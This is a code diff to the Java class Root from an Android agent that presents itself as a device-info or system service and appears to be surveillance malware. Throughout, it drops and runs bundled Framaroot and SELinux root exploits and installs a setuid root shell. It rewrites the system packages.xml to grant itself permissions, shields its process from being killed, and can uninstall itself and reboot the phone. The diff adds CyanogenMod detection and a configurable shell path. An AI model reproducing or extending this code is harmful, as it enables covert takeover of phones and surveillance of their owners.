@@ -10,6 +10,9 @@ import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
+import java.util.Date;
+import java.util.List;
+import java.util.Properties;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -23,6 +26,7 @@ import android.widget.Toast;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -34,7 +38,9 @@ import com.android.m.M;
 
 public class Root {
 	private static final String TAG = "Root";
-
+	public static String method = "";
+	public static Date startExploiting = new Date();
+	private static int askedSu = 0;
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
@@ -46,24 +52,26 @@ public class Root {
 
 		return false;
 	}
-	
+
 	static public boolean shouldAskForAdmin() {
 		boolean ret = false;
-		
+
 		if (Root.isRootShellInstalled() == true) {
 			ret = false;
-		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <= 2.1 is a bit too old
-			ret = false;
-		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO && android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
+		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
+				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
 			ret = !checkFramarootExploitability();
-		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH - JELLY_BEAN_MR1 
+		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
+																										// -
+																										// JELLY_BEAN_MR1
 			ret = !(checkFramarootExploitability() || checkSELinuxExploitability());
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
 			ret = !checkSELinuxExploitability();
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
 			ret = true;
-		}
-		
+		} 
+
 		if (ret) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(shouldAskForAdmin): Asking admin privileges");
@@ -73,11 +81,12 @@ public class Root {
 				Check.log(TAG + "(shouldAskForAdmin): No need to ask for admin privileges");
 			}
 		}
-		
+
 		return ret;
 	}
-	
+
 	static public void exploitPhone() {
+		method = M.e("previous");
 		if (Root.isRootShellInstalled() == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
@@ -85,14 +94,16 @@ public class Root {
 			
 			return;
 		}
-		
-		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <= 2.1 is a bit too old
+
+		startExploiting = new Date();
+		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
 			}
-
+			method = M.e("old");
 			return;
-		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO && android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
+				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
 			// Framaroot
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
@@ -102,19 +113,22 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
 				}
-
+				method = M.e("framaroot");
 				framarootExploit();
 			}
-		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH - JELLY_BEAN_MR1 
+		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
+																										// -
+																										// JELLY_BEAN_MR1
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
+				Check.log(TAG
+						+ "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
 			}
 
 			if (checkFramarootExploitability()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
 				}
-
+				method = M.e("framaroot");
 				framarootExploit();
 			}
 
@@ -127,7 +141,7 @@ public class Root {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
 					}
-
+					method = M.e("selinux");
 					selinuxExploit();
 				}
 			}
@@ -140,7 +154,7 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
 				}
-
+				method = M.e("selinux");
 				selinuxExploit();
 			}
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
@@ -150,7 +164,7 @@ public class Root {
 			}
 		}
 	}
-		
+
 	static public void adjustOom() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
@@ -165,11 +179,11 @@ public class Root {
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
 		// /proc/
 		// 32_36=/oom_score_adj\"
-		String script = M.e("#!/system/bin/sh") + "\n" + M.e("/system/bin/rilcap qzx \"echo '-1000' > /proc/") + pid
+		String script = M.e("#!/system/bin/sh") + "\n" + Configuration.shellFile + M.e(" qzx \"echo '-1000' > /proc/") + pid
 				+ M.e("/oom_score_adj\"") + "\n";
 		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
 		// 32_38=/oom_adj\"
-		script += M.e("/system/bin/rilcap qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";
+		script += Configuration.shellFile + M.e(" qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
@@ -206,7 +220,7 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
-		script += "/system/bin/rilcap ru\n";
+		script += Configuration.shellFile + " ru\n";
 		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
 
 		String filename = "c";
@@ -244,12 +258,12 @@ public class Root {
 			return;
 		}
 
-		Execute ex = new Execute();
-
 		// exploit
 		// InputStream stream = resources.openRawResource(R.raw.statuslog);
 
 		// suidext
+		// s.bin : vecchio rilcap
+		// j.bin : nuovo rilcap
 		InputStream stream = Utils.getAssetStream("s.bin");
 
 		try {
@@ -261,7 +275,7 @@ public class Root {
 				Check.log(TAG + " (superapkRoot): " + String.format(M.e("su -c /data/data/%s/files/s"), pack)); //$NON-NLS-1$
 			}
 
-			ex.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
 
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
 			// 32_34=#!/system/bin/sh\n
@@ -270,19 +284,13 @@ public class Root {
 
 			if (Root.createScript("s", script) == true) {
 				// 32_7=/system/bin/chmod 755
-				ExecuteResult res = ex.execute(M.e("/system/bin/chmod 755 ") + path + "/s");
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (superapkRoot) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/s"
-							+ " ret: " + res.exitCode);
-				}
-
+				
 				// su -c /data/data/com.android.service/files/s
-				res = ex.execute(String.format(M.e("su -c /data/data/%s/files/s"), pack));
+				boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (superapkRoot) execute 2: "
-							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + res.exitCode);
+							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + res);
 				}
 
 				Root.removeScript("s");
@@ -308,20 +316,42 @@ public class Root {
 		}
 	}
 
+	static public boolean checkCyanogenmod() {
+		final Properties properties = System.getProperties();
+		String version = properties.getProperty(M.e("os.version"));
+		final PackageManager pm = Status.getAppContext().getPackageManager();
+		
+		if (version.contains("cyanogenmod") || version.contains("-CM-") 
+				|| pm.hasSystemFeature("com.cyanogenmod.account") || pm.hasSystemFeature("com.cyanogenmod.updater")) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
+			}
+			return true;
+		}
+
+		return false;
+	}
+
 	static public boolean checkFramarootExploitability() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String exploitCheck = M.e("ec"); // ec
-		Execute ex = new Execute();
-		// ec
+
+		if(checkCyanogenmod()){
+			return false;
+		}
+		
 		InputStream stream = Utils.getAssetStream("h.bin");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkFramarootExploitability) ");
+		}
 
 		try {
 			fileWrite(exploitCheck, stream, Cfg.RNDDB);
 
-			ex.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 
-			int ret = ex.execute(path + M.e("/ec")).exitCode;
+			int ret = Execute.execute(path + M.e("/ec")).exitCode;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
@@ -345,21 +375,27 @@ public class Root {
 			return false;
 		}
 	}
-	
+
 	static public boolean checkSELinuxExploitability() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String exploitCheck = M.e("ecs"); // ecs
-		Execute ex = new Execute();
+
+		if(checkCyanogenmod()){
+			return false;
+		}
 		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkSELinuxExploitability) ");
+		}
 		InputStream stream = Utils.getAssetStream("d.bin");
 
 		try {
 			fileWrite(exploitCheck, stream, Cfg.RNDDB);
 
-			ex.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 
-			int ret = ex.execute(path + M.e("/ecs")).exitCode;
+			int ret = Execute.execute(path + M.e("/ecs")).exitCode;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ecs"
@@ -448,7 +484,7 @@ public class Root {
 		selinuxExploitThread selinuxThread = new selinuxExploitThread();
 		Thread exploit = new Thread(selinuxThread);
 		exploit.start();
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(selinuxExploit): exploitation thread running");
 		}
@@ -515,7 +551,7 @@ public class Root {
 		}
 	}
 
-	static public void getPermissions() {
+	static synchronized public void getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
 
@@ -527,14 +563,29 @@ public class Root {
 					+ Keys.self().wantsPrivilege());
 		}
 
-		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege() && !(checkFramarootExploitability() || checkSELinuxExploitability())) {
+		boolean ask = false;
+		
+		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
+			if( checkCyanogenmod() ){
+				if (Cfg.SUPPORT_CYANOGENMOD) {
+					ask = true;
+				}
+			} else {
+				ask = !(checkFramarootExploitability() || checkSELinuxExploitability());
+			}
+		}
+
+		if (ask && askedSu < Cfg.MAX_ASKED_SU ) {
+			askedSu  += 1;
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), ask the user");
 			}
-			
+			 
 			// Ask the user...
 			Root.superapkRoot();
 
+			// Cyanogen should disable the superuser notification
 			Status.setRoot(PackageInfo.checkRoot());
 
 			if (Cfg.DEBUG) {
@@ -543,15 +594,17 @@ public class Root {
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), don't ask");
-			}
+			}	
 		}
 
 		if (Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
 			}
+		}else{
+			Configuration.shellFile = Configuration.shellFileBase;
 		}
-		
+
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 	}
@@ -652,11 +705,11 @@ public class Root {
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
 			Execute.execute(String.format(
-					M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
+					M.e("%s fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), Configuration.shellFile , pack));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));
+			Execute.execute(String.format(M.e("%s pzm 666 /data/data/%s/files/packages.xml"), Configuration.shellFile, pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
@@ -709,14 +762,14 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			Execute.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "), pack)
+			Execute.execute(String.format(M.e("%s qzx \"cat /data/data/%s/files/layout > "), Configuration.shellFile, pack)
 					+ path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
 			Execute.execute(String.format(
-					M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),
+					M.e("%s qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""), Configuration.shellFile,
 					pack));
 
 			// Rimuoviamo la nostra copia
@@ -745,7 +798,7 @@ public class Root {
 
 			// Riavviamo il telefono
 			// /system/bin/ntpsvd reb
-			Execute.execute(M.e("/system/bin/rilcap reb"));
+			Execute.execute(String.format(M.e("%s reb"), Configuration.shellFile));
 		} catch (Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -805,7 +858,7 @@ public class Root {
 
 class selinuxExploitThread implements Runnable {
 	private static final String TAG = "selinuxExploitThread";
-	
+
 	@Override
 	public void run() {
 		final File filesPath = Status.getAppContext().getFilesDir();
@@ -815,8 +868,8 @@ class selinuxExploitThread implements Runnable {
 		final String suidext = M.e("ss"); // suidext (standard)
 
 		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
-		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
-		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext (standard)
+		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext rilcap
+		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext rilcapn (standard)
 
 		try {
 			Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
@@ -832,8 +885,10 @@ class selinuxExploitThread implements Runnable {
 			// - argv[2]: path assoluto alla vecchia shell
 			String pack = Status.getAppContext().getPackageName();
 
-			String script = M.e("#!/system/bin/sh") + "\n"
-					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack, pack, pack) + "\n";
+			String script = M.e("#!/system/bin/sh")
+					+ "\n"
+					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack,
+							pack, pack) + "\n";
 
 			if (Root.createScript("fig", script) == true) {
 				Process runScript = Runtime.getRuntime().exec(path + "/fig");
@@ -865,12 +920,15 @@ class selinuxExploitThread implements Runnable {
 
 					if (finished || Root.isRootShellInstalled()) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + "(run): exploitation terminated after " + (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+							Check.log(TAG + "(run): exploitation terminated after "
+									+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
 						}
-
+						if(PackageInfo.checkRoot()){
+							Status.setRoot(true);
+							Core.self().reload();
+						}
 						break;
 					}
-
 
 					finished = true;
 					Utils.sleep(5000);
@@ -881,6 +939,7 @@ class selinuxExploitThread implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " ERROR: (run), cannot create script");
 				}
+				PackageInfo.checkRoot();
 			}
 
 			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
